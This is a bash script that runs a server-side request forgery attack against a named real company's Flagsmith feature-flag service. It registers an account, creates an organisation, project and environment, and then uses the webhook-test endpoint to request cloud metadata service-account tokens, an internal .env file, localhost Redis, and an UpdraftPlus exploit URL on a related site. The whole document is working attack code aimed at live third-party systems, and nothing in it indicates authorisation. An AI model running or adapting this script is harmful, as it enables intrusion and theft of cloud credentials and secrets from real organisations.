#!/bin/bash
set -e
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
echo "IP: $(curl -s https://ifconfig.me)"

# Register
ACCT=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/auth/users/" \
  -H "Content-Type: application/json" \
  -H "User-Agent: $UA" \
  -H "Accept: application/json" \
  -d '{"email":"kw-scan-9f3x@proton.me","password":"Xk9mPw3nRt7vBz!","first_name":"GH","last_name":"R"}' \
  --max-time 15)
echo "Reg: $ACCT"
KEY=$(echo "$ACCT" | python3 -c "import json,sys; print(json.load(sys.stdin).get('key',''))" 2>/dev/null)
[ -z "$KEY" ] && echo "FAILED: No key" && exit 1

# Org
OID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/organisations/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" \
  -H "User-Agent: $UA" -H "Accept: application/json" \
  -d '{"name":"gh2"}' --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
echo "Org: $OID"

# Project
PID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/projects/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" \
  -H "User-Agent: $UA" -H "Accept: application/json" \
  -d "{\"name\":\"g2\",\"organisation\":$OID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
echo "Proj: $PID"

# Env
EKEY=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" \
  -H "User-Agent: $UA" -H "Accept: application/json" \
  -d "{\"name\":\"g2\",\"project\":$PID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('api_key',''))" 2>/dev/null)
echo "Env: $EKEY"

SSRF() {
  curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" \
    -H "User-Agent: $UA" -H "Accept: application/json" \
    -d "{\"url\":\"$1\"}" --max-time 20
}

# Test 1: koinp2p homepage (CF bypass test)
echo "=== KOINP2P ==="
SSRF "https://koinp2p.com/"
echo ""

# Test 2: magellan .env (internal access)
echo "=== MAGELLAN .ENV ==="
SSRF "https://magellan.koinworks.com/.env"
echo ""

# Test 3: GCP metadata v1beta1 
echo "=== GCP METADATA ==="
SSRF "http://169.254.169.254/computeMetadata/v1beta1/instance/service-accounts/default/token"
echo ""

# Test 4: GCP metadata v1 (without header - some configs allow)
echo "=== GCP METADATA V1 ==="
SSRF "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
echo ""

# Test 5: localhost Redis
echo "=== REDIS ==="
SSRF "http://127.0.0.1:6379/"
echo ""

# Test 6: CVE exploit on koinp2p
echo "=== CVE EXPLOIT ==="
SSRF "https://koinp2p.com/wp-admin/admin-ajax.php?action=updraft_central_receive_message&format=1&key_name=0.central.updraftplus.com&udrpc_message=test"
echo ""
